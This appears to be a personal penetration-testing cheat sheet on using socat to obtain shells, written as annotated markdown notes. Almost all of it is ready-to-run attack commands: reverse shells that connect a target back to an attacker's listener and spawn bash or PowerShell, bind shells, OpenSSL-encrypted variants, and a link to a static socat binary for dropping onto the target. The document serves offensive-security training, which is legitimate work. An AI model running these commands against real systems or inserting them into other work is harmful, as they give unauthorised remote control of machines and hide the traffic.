## Socat (Soviet Gato)
​
Socat is like [[Netcat]] on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, have a more difficult syntax and is not very common that is installed in the target machine.
​
​
### Reverse Shell
​
#### Listener (attacker machine)
First we have the basic command that give us an unnestable shell:
​

>[!Tip] Option A
>```
>socat TCP-L:{any local port} -
>```

​
And then we have a command that will work only for ==Linux targets== but have a more stable shell result:
​

>[!Success] Option B
>```
>socat TCP-L:{any local port} FILE:tty,raw,echo=0
>```

​
​
#### Talker (target machine)
We are going to divide this sections based in its two posible target's operation system, but first we have to install a precompiled version of Socat in the target machine:
​

> [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

​
##### Linux

>[!Tip] For Option A
>```
>socat TCP:{local IP}:{local port} EXEC:"bash -li"
>```

​
Then, if you choosed to use the stable version (green box called Success) you must use the following stable feedback:
​

>[!Success] For Option B
>```
>socat TCP:{local IP}:{local port} EXEC:"bash -li",pty,stderr,sigint,setsid,sane
>```

- **EXEC:"bash -li"**, creates an interactive bash session
- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it

​​
​​
##### Windows

>[!Success]
>```
>socat TCP:{local IP}:{local port} EXEC:powershell.exe,pipes
>```

​
​
### Bind Shell
​
#### Listener (target machine)

It changes depending on the OS that the machine is using:
​
##### Linux

>[!Tip] Chebra
>```
>socat TCP-L:{target port} EXEC:"bash -li"
>```

​
​
##### Windows

>[!Tip] Chebra
>```
>socat TCP-L:{target port} EXEC:powershell.exe,pipes
>```

​
​
#### Talker (attacking machine)

>[!Tip] Chebra
>```
>socat TCP:{target IP}:{target port} -
>```

​
​
### Encrypted Shell
​
1. Generate OPENSSL certificates in order to use encrypted shells (attacking machine):
   
   >[!Tip] Chebra
   >```
   >openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
   >```
   
   ​
   This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
   ​
   ​
2. Merge the created files:
   
   >[!Tip] Chebra
   >```
   >cat shell.key shell.crt > shell.pem
   >```
   
   ​
   Merge them into a single ==.pem== file
   ​
   ​
3. Take on of the followings:
   ​
   #### Reverse Shell
   ##### Listener (Attacker Machine)
   
   >[!Tip] Chebra
   >```
   >socat OPENSSL-LISTEN:{target port},cert=shell.pem,verify=0 -
   >```
   
   ​
   This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate _must_ be used on whichever device is listening.
   ​
   ​
   ##### Talker (Target Machine)
   
   >[!Tip] Chebra
   >```
   >socat OPENSSL:{local IP}:{local port},verify=0 EXEC:/bin/bash
   >```
   
   ​
   ​
   #### Bind Shell
   ##### Listener (Target Machine)
   
   >[!Tip] Chebra
   >```
   >socat OPENSSL-LISTEN:{any target port},cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
   >```
   
   ​
   ​
   ##### Talker (Attacker Machine)
   
   >[!Tip] Chebra
   >```
   >socat OPENSSL:{target IP}:{target port},verify=0 -
   >```
   
   ​
   Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.